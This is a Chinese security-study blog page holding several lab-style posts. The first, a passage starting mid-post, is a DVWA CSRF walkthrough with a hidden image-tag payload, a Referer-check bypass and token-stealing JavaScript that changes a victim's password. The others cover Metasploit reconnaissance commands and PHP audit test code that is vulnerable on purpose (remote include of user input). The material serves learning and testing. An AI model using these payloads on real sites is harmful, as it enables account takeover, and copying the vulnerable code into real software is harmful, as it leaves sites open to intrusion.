<p> i 表示不区分大小写；<br>       “/[a-zA-Z]/“ &lt;==&gt;”/[a-z]/i”</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h2><h3 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h3><p><strong>白盒测试，源码：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">$pass_new = md5( $pass_new );</span><br></pre></td></tr></table></figure>

<p>可以看出，这里只对GET进行了防sql注入，并没防CSRF机制</p>
<p>构造页面test.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://127.0.0.1:12138/vulnerabilities/csrf/?password_new=123123chj&amp;password_conf=123123chj&amp;Change=Change#"</span> border=<span class="string">"0"</span> style=<span class="string">"display:none;"</span> /&gt;</span><br><span class="line">&lt;h1&gt;<span class="number">404</span>&lt;h1&gt;</span><br><span class="line">&lt;h2&gt;file not found&lt;h2&gt;</span><br></pre></td></tr></table></figure>

<p>只要引诱别人点击此，就可成功修改其密码。</p>
<p><strong>黑盒测试：</strong></p>
<p><strong>抓包查看有没有token</strong></p>
<p><strong>如果没有token，直接请求这个页面，不带refer</strong></p>
<p><strong>如果返回的数据还是一样的话，那说明很有可能有CSRF漏洞了，这是一个黑盒的挖掘方法</strong></p>
<p>抓包分析，发现有refer</p>
<p>删除refer观察发现返回结果一致</p>
<p>直接构造url，欺骗用户点击即可。</p>
<hr>
<h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a><strong>medium</strong></h3><p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ) ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>防CSRF攻击代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eregi( $_SERVER[ <span class="string">'SERVER_NAME'</span> ], $_SERVER[ <span class="string">'HTTP_REFERER'</span> ])</span><br></pre></td></tr></table></figure>

<p>解析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eregi(string pattern, string str)：</span><br><span class="line"><span class="comment">#检查str中是否含有pattern（不区分大小写），如果有返回True，反之False。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP超全局变量$_SERVER中的两个值：</span><br><span class="line">$_SERVER[<span class="string">'HTTP_REFERER'</span>]：PHP中获取链接到当前页面的前一页面的url链接地址，即HTTP数据包中的Referer参数的值。</span><br><span class="line">$_SERVER[<span class="string">'SERVER_NAME'</span>]：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。</span><br></pre></td></tr></table></figure>

<p>Referer参数的值，表示来源地址</p>
<p>Host：请求资源所在服务器</p>
<p>这种机制下，就要求来源地址要包含服务器主机地址</p>
<p><strong>绕过方式：</strong></p>
<p>假设攻击服务器主机的域名的域名为：<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
<p>攻击者本机域名为：<a href="http://www.ccc.com" target="_blank" rel="noopener">www.ccc.com</a></p>
<p>则只需要将文件名改为<a href="http://www.chj.com" target="_blank" rel="noopener">www.chj.com</a></p>
<p>那么访问的时候refer便是<a href="http://www.ccc.com/www.chj.com" target="_blank" rel="noopener">www.ccc.com/www.chj.com</a></p>
<p>成功包含host，即可绕过。</p>
<p><strong>目前高版本的PHP已经放弃这个函数了，如php5.3</strong></p>
<hr>
<h3 id="high-1"><a href="#high-1" class="headerlink" title="high"></a><strong>high</strong></h3><p>源码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = mysql_real_escape_string( $pass_new );</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>防护机制：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>

<p>抓包发现，这个token是随机生成的，所以要想绕过此机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</p>
<p>攻击代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">alert(document.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://www.dvwa.com/vulnerabilities/csrf/'</span>;</span><br><span class="line">    <span class="keyword">if</span>(window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    xmlhttp.withCredentials = <span class="keyword">true</span>;</span><br><span class="line">    xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">            <span class="keyword">var</span> regex = /user_token\<span class="string">' value\=\'(.*?)\' \/\&gt;/;</span></span><br><span class="line"><span class="string">            var match = text.match(regex);</span></span><br><span class="line"><span class="string">            console.log(match);</span></span><br><span class="line"><span class="string">            alert(match[1]);</span></span><br><span class="line"><span class="string">                var token = match[1];</span></span><br><span class="line"><span class="string">                    var new_url = '</span>http:<span class="comment">//127.0.0.1/vulnerabilities/csrf/?user_token='+token+'&amp;password_new=test&amp;password_conf=test&amp;Change=Change';</span></span><br><span class="line">                    <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="keyword">false</span>);</span><br><span class="line">                        xmlhttp.send();</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="keyword">false</span>);</span><br><span class="line">    xmlhttp.send();</span><br></pre></td></tr></table></figure>






      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-Metasploit魔鬼训练营" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/"
    >Metasploit魔鬼训练营</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/" class="article-date">
  <time datetime="2020-04-01T08:48:01.000Z" itemprop="datePublished">2020-04-01</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="一、基础知识概念"><a href="#一、基础知识概念" class="headerlink" title="一、基础知识概念"></a><strong>一、基础知识概念</strong></h2><p><strong>黑盒测试：</strong>设计为模拟一个对客户组织一无所知的攻击者所进行的渗透攻击</p>
<p><strong>白盒测试：</strong>拥有客户组织所有知识的情况下，进行的渗透测试</p>
<p>PTES渗透测试标准，具体包括7个阶段：</p>
<p><strong>1.前期交互截断</strong></p>
<p>  确定渗透测试的范围、目标、限制条件以及服务合同细节。主要是收集客户需求、准备测试计划、定义测试范围与边界、定义业务目标等</p>
<p><strong>2.情报收集阶段</strong></p>
<p><strong>3.威胁建模阶段</strong></p>
<p><strong>4.漏洞分析阶段</strong></p>
<p><strong>5.渗透攻击阶段</strong></p>
<p><strong>6.后渗透攻击阶段</strong></p>
<p><strong>7.报告阶段</strong></p>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a><strong>二、信息收集</strong></h2><p>信息收集在渗透测试过程是非常重要的一环，收集的信息越多，就可以发现越多的突破口</p>
<p>在信息收集过程中，最好与目标系统不产生直接交互，尽量避免在日志中留下痕迹。<br>信息收集内容<strong>：IP地址、域名信息、邮件地址、文档图片数据、公司地址、公司组织架构、联系电话/传真号码、人员姓名/职务、目标系统使用的技术架构、公开的商业信息等。</strong></p>
<p><strong>DNS域名解析流程</strong></p>
<p>1.用户输入网址 <a href="http://www.abc.com/" target="_blank" rel="noopener">www.abc.com</a>,主机先向其本地域名服务器进行递归查询。<br>2.本地域名服务器查询不到该域名的IP信息，然后本地域名服务器采用迭代查询向根域名服务器请求解析 <a href="http://www.abc.com/" target="_blank" rel="noopener">www.abc.com</a> 这个域名的IP地址。<br>3.根域名服务器一般不会直接把待查询的域名直接转换成IP地址，而是会告诉本地域名服务器去向顶级域名服务器–com域名服务器进行查询。<br>4.<strong>本地域名服务器向顶级域名服务器–com域名服务器进行查询</strong>。<br>5.顶级域名服务器–<strong>com域名服务器告诉本地域名服务器</strong>，<strong>下一次应查询的权限域名服务器的IP地址</strong>。<br>6.<strong>本地域名服务器向权限域名服务器–abc域名服务器进行查询</strong>。<br>7.权限域名服务器–abc域名服务器告诉本地域名服务器，所查询的 <a href="http://www.abc.com/" target="_blank" rel="noopener">www.abc.com</a> 的这个域名的IP地址。<br>8.本地域名服务器拿到 <a href="http://www.abc.com/" target="_blank" rel="noopener">www.abc.com</a> 这个域名的IP地址后，<strong>先在自己本地的域名服务器中缓存一份</strong>，然后再将这个域名的IP地址告诉主机。<br>9.当下次再请求 <a href="http://www.abc.com/" target="_blank" rel="noopener">www.abc.com</a> 这个域名时，<strong>就可以直接查询本地域名服务器得到IP地址</strong>，而<strong>不用再去向根域名服务器查询。这样加快了解析时间</strong></p>
<p><img src="/2020/04/01/Metasploit%E9%AD%94%E9%AC%BC%E8%AE%AD%E7%BB%83%E8%90%A5/1.png" alt></p>
<p><strong>DNS域名记录解释：</strong></p>
<ul>
<li><strong>A记录</strong>:A (Address) 记录是用来指定主机名（或域名）对应的IP地址记录，域名绑定A记录就是告诉DNS，当输入域名的时候给你导向那个A记录所对应的服务器。(<strong>一个域名可以指定多个A记录，这样就可以实现负载均衡</strong>)</li>
<li><strong>NS记录</strong>:NS（Name Server）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。</li>
<li><strong>SOA记录</strong>:SOA（Start Of Authority）记录是起始授权机构记录，SOA记录说明了在众多NS记录里哪一台才是主DNS服务器。</li>
<li><strong>MX记录</strong>:MX (MX record)记录是邮件交换记录，这是域名系统（DNS）中的一种资源记录类型，用于指定负责处理发往收件人域名的邮件服务器。</li>
<li><strong>CNAME记录</strong>:CNAME（Canonical Name）记录，通常称别名指向。在这里，您可以定义一个主机别名，比如设置 <a href="http://www.a.com/" target="_blank" rel="noopener">www.A.com</a>，用来指向一个主机 <a href="http://www.b.com/" target="_blank" rel="noopener">www.B.com</a>，那么以后就可以用 <a href="http://www.a.com/" target="_blank" rel="noopener">www.A.com</a> 来代替访问 <a href="http://www.b.com/" target="_blank" rel="noopener">www.B.com</a> 了。</li>
<li><strong>PTR记录</strong>:PTR (Pointer Record)，反向地址解析记录，作用是把IP地址解析为域名。DNS的反向区域负责从IP到域名的解析，因此如果要创建PTR记录，必须在反向区域中创建。</li>
</ul>
<h3 id="1-外围信息收集"><a href="#1-外围信息收集" class="headerlink" title="1.外围信息收集"></a>1.外围信息收集</h3><p><strong>whois域名注册信息查询</strong></p>
<p>一般域名注册信息包含<strong>域名所有者、服务商、管理员邮件地址、域名注册信息和过期日期</strong>等</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; whois testfire.net</span><br><span class="line">[*] exec: whois testfire.net</span><br><span class="line">   Domain Name: TESTFIRE.NET</span><br><span class="line">   Registry Domain ID: 8363973_DOMAIN_NET-VRSN</span><br><span class="line">   Registrar WHOIS Server: whois.corporatedomains.com</span><br><span class="line">   Registrar URL: http://www.cscglobal.com/global/web/csc/digital-brand-services.html</span><br><span class="line">   Updated Date: 2019-09-08T04:08:07Z</span><br><span class="line">   Creation Date: 1999-07-23T13:52:32Z</span><br><span class="line">   Registry Expiry Date: 2020-07-23T13:52:32Z</span><br><span class="line">   Registrar: CSC Corporate Domains, Inc.</span><br><span class="line">   Registrar IANA ID: 299</span><br><span class="line">   Registrar Abuse Contact Email: domainabuse@cscglobal.com</span><br><span class="line">   Registrar Abuse Contact Phone: 8887802723</span><br></pre></td></tr></table></figure>

<p>注意：查询的时候去掉www、ftp等前缀，<a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 是abc.com的一个子域名</p>
<p><strong>查询指定域名对应IP地址，nslookup/dig</strong></p>
<p>如今许多网站都采用了CDN技术，查询其真实ip不能只看一次</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nslookup</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">set</span> <span class="built_in">type</span>=A  <span class="comment">#可以对其ip地址进行解析   set type=MX 可以查找邮件转发服务器</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> testfire.net</span></span><br><span class="line">Server:         114.114.114.114</span><br><span class="line">Address:        114.114.114.114#</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   testfire.net</span><br><span class="line">Address: 65.61.137.117</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; dig @ASIA3.AKAM.NET testfire.net  #使用方法--dig @DNS服务器 待查询的域名</span><br><span class="line">[*] exec: dig @ASIA3.AKAM.NET testfire.net</span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;&gt;&gt; @ASIA3.AKAM.NET testfire.net</span><br><span class="line">......</span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">testfire.net.           86400   IN      A       65.61.137.117</span><br><span class="line">;; Query time: 300 msec</span><br><span class="line">;; SERVER: 23.211.61.64#53(23.211.61.64)</span><br><span class="line">;; WHEN: 四 4月 23 22:19:09 CST 2020</span><br><span class="line">;; MSG SIZE  rcvd: 57</span><br></pre></td></tr></table></figure>






      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-代码审计" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"
    >代码审计</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="article-date">
  <time datetime="2020-03-26T06:15:23.000Z" itemprop="datePublished">2020-03-26</time>
</a>
      
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
  </div>

      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="PHP核心配值解释"><a href="#PHP核心配值解释" class="headerlink" title="PHP核心配值解释"></a>PHP核心配值解释</h2><p>​                                                                       <strong>PHP_INI_* 模式的定义</strong></p>
<table>
<thead>
<tr>
<th>模式</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><em>PHP_INI_USER</em></td>
<td>可在用户脚本（例如  ini_set() ）或 Windows 注册表（自 PHP 5.3 起）以及 .user.ini 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_PERDIR</em></td>
<td>可在 php.ini，.htaccess 或 httpd.conf 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_SYSTEM</em></td>
<td>可在 php.ini 或 httpd.conf 中设定</td>
</tr>
<tr>
<td><em>PHP_INI_ALL</em></td>
<td>可在任何地方设定</td>
</tr>
<tr>
<td><em>php_ini only</em></td>
<td>仅可在php.ini中配值</td>
</tr>
</tbody></table>
<h3 id="1-register-globals-全局变量注册开关"><a href="#1-register-globals-全局变量注册开关" class="headerlink" title="1.register_globals(全局变量注册开关)"></a><strong>1.register_globals(全局变量注册开关)</strong></h3><p>on——会直接把拥护GET、POST等方式提交上来的参数注册成全局变量，并初始化值为参数对应的值，使得题交参数可以直接在脚本中使用。</p>
<p>PHP5.4.0以下的版本可以正常使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($user==<span class="string">'admin'</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'chj'</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span>php</span><br></pre></td></tr></table></figure>

<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/3.png" alt="3" style="zoom: 80%;">

<h3 id="2-allow-url-include-是否允许包含远程文件"><a href="#2-allow-url-include-是否允许包含远程文件" class="headerlink" title="2.allow_url_include(是否允许包含远程文件)"></a><strong>2.allow_url_include(是否允许包含远程文件)</strong></h3><p>on——可以直接包含远程文件   </p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/03/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1.png" style="zoom:80%;">

<h3 id="3-magic-quotes-gpc-魔术引号自动过滤"><a href="#3-magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="3.magic_quotes_gpc(魔术引号自动过滤)"></a><strong>3.magic_quotes_gpc(魔术引号自动过滤)</strong></h3><p>on——会自动在GET、POST、COOKIE变量中的 ‘  ‘’  \  以及空字符NULL 的前面加上反斜杠（\）</p>
<p>但是PHP5中的magic_quotes_gpc并<strong>不会过滤$_SERVER变量</strong>，导致很多<strong>类似client-ip,referer</strong>一类的漏洞能够利用。</p>
<p>PHP5.4版本之后<strong>取消了magic_quotes_gpc</strong></p>
<p>PHP版本小于4.2.3时，配值范围是PHP_INI_ALL</p>
<p>PHP版本大于4.2.3时，是PHP_INI_PERDIR</p>
<p>测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'chj'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

